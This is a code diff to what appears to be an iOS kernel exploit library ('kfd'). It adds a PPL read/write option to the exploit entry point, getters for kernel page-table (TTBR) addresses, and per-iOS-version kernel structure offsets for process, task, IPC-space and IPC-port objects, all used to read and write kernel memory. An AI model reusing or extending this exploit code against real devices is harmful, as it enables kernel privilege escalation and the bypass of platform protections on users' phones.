@@ -87,12 +87,15 @@ void kfd_free(struct kfd* kfd) {
     bzero_free(kfd, sizeof(struct kfd));
 }
 
-uint64_t kopen(uint64_t exploit_type) {
+uint64_t kopen(uint64_t exploit_type, uint64_t pplrw) {
     int fail = -1;
     
     struct kfd* kfd = kfd_init(exploit_type);
     
     kfd->info.env.exploit_type = exploit_type;
+    kfd->info.env.pplrw = false;
+    if(pplrw == 0)
+        kfd->info.env.pplrw = true;
 
 retry:
     puaf_run(kfd);
@@ -114,6 +117,8 @@ retry:
     info_run(kfd);
     if(isarm64e() && kfd->info.env.vid >= 6)
         perf_run(kfd);
+    if(isarm64e() && kfd->info.env.vid <= 5 && kfd->info.env.pplrw)
+        perf_ptov(kfd);
     puaf_cleanup(kfd);
     
     return (uint64_t)(kfd);
@@ -244,6 +249,14 @@ uint64_t get_kernel_map(void) {
     return ((struct kfd*)_kfd)->info.kernel.kernel_map;
 }
 
+uint64_t get_kernel_ttbr0va(void) {
+    return ((struct kfd*)_kfd)->info.kernel.ttbr[0].va;
+}
+
+uint64_t get_kernel_ttbr1va(void) {
+    return ((struct kfd*)_kfd)->info.kernel.ttbr[1].va;
+}
+
 uint64_t get_kw_object_uaddr(void) {
     return ((struct kfd*)_kfd)->kwrite.krkw_object_uaddr;
 }
@@ -319,12 +332,20 @@ uint64_t get_proc(pid_t target) {
     return proc_kaddr;
 }
 
+uint64_t off_pmap_tte = 0;
+
 uint64_t off_p_pfd    = 0;
 uint64_t off_p_textvp = 0;
 
 uint64_t off_fp_glob = 0;
 uint64_t off_fg_data = 0;
 uint64_t off_fg_flag = 0;
+
+uint64_t off_task_itk_space = 0;
+
+uint64_t off_ipc_port_ip_kobject = 0x48;
+uint64_t off_ipc_space_is_table  = 0;
+uint64_t off_ipc_entry_ie_object = 0;
 
 uint64_t off_fd_cdir = 0x20;
 
@@ -351,18 +372,33 @@ uint64_t off_vnode_v_type                   = 0x70;
 
 void offset_exporter(void) {
     struct kfd* kfd = ((struct kfd*)_kfd);
+    off_pmap_tte = static_offsetof(pmap, tte);
+    
     off_p_pfd = dynamic_offsetof(proc, p_fd_fd_ofiles);
+    off_task_itk_space = dynamic_offsetof(task, itk_space);
     
     off_fp_glob = static_offsetof(fileproc, fp_glob);
     off_fg_data = static_offsetof(fileglob, fg_data);
     off_fg_flag = static_offsetof(fileglob, fg_flag);
     
+    off_ipc_space_is_table  = static_offsetof(ipc_space, is_table);
+    off_ipc_entry_ie_object = static_offsetof(ipc_entry, ie_object);
     
-    if(kfd->info.env.vid == 7 || kfd->info.env.vid == 9) {
-        off_p_textvp = 0x350;
-        off_namecache_nc_child_tqe_prev = 0x10;
-    } else if(kfd->info.env.vid == 11) {
+    if(kfd->info.env.vid >= 10) {
         off_p_textvp = 0x548;
         off_namecache_nc_child_tqe_prev = 0x0;
+    }
+    
+    if(kfd->info.env.vid <= 9) {
+        off_p_textvp = 0x350;
+        off_namecache_nc_child_tqe_prev = 0x10;
+    }
+    
+    if(kfd->info.env.vid <= 5) {
+        off_ipc_port_ip_kobject = 0x58;
+    }
+    
+    if(kfd->info.env.vid <= 3) {
+        off_p_textvp = 0x2a8;
     }
 }
